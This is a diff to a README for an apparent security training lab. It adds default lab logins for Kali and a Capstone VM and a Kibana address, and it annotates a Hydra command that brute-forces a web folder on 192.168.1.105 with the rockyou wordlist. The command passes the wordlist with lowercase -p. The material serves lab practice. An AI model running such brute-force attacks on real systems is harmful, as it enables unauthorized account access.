@@ -43,7 +43,13 @@ There are three Machines in the network
 
 3) ELK VM - For monitoring and generating logs
 
+## Logins
 
+- Login credentials for Kali linux are: `root:toor`
+
+- Capstone VM credentials: `vagrant:tnargav` and switch to the root user with `sudo su`
+
+- Double-click the Google Chrome icon on the Windows host's desktop to launch Kibana. If it doesn't load as the default page, navigate to http://192.168.1.105:5601.
 
 
 **Setting up Capstone VM to enable collection of Logs**
@@ -123,7 +129,7 @@ c) **Exploitation**
 
 - `gunzip /usr/share/wordlists/rockyou.txt.gz`
 
-- Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/`
+- Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/` Here http-get will go to the website which is the ip address that we have already provided and will navigate to the path like: `http-get 192.168.1.105/company_folders/secret_folder/`
 
 - On accessing the secret folder, a new username noted: ryan, need to crack its hash that is also provided in the secret folder
 
